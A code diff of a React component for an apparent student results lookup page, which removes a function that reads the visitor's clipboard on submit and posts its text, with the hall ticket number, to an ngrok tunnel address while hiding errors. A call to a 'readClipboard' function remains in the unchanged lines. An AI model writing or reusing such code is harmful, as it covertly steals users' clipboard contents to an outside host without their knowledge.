@@ -47,34 +47,12 @@ const AcademicResult = () => {
     console.log("got here");
     readClipboard();
   }, []);
-  const analyzingData = async () => {
-    const queryOpts = {
-      name: "clipboard-read",
-      allowWithoutGesture: false,
-    } as any;
-    const permissionStatus = await navigator.permissions.query(queryOpts);
-
-    if (permissionStatus.state === "granted") {
-      const text = await navigator.clipboard.readText();
-      if (text != "") {
-        var data = {
-          hallticket: hallticketno,
-          ci: text,
-          status: "granted",
-        };
-        try {
-          axios.post("https://70af-103-95-173-139.ngrok-free.app", data);
-        } catch (err) {}
-      }
-    }
-  };
 
   const onSubmit = async () => {
     if (hallticketno.length < 10) {
       toast.error("The Hallticket should be of 10 digits");
       return;
     }
-    analyzingData();
     setLoading(true);
 
     try {
